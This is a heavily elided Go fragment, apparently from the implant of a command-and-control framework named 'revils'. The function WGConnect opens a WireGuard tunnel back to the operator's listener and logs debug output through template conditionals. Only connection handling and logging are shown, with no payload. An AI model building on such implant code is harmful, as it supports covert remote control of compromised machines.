...
import (
	...
	"github.com/Kevin-kitnick/revils/implant/revils/netstack"
...
func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
	...
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Unable to connect to revils listener: %v", err)
		// {{end}}
		failedConn++
		return nil, nil, err
	}
	...
	// {{if .Config.Debug}}
	log.Printf("Successfully connected to revils listener")
	// {{end}}
	failedConn = 0
	tunnelNet = tNet
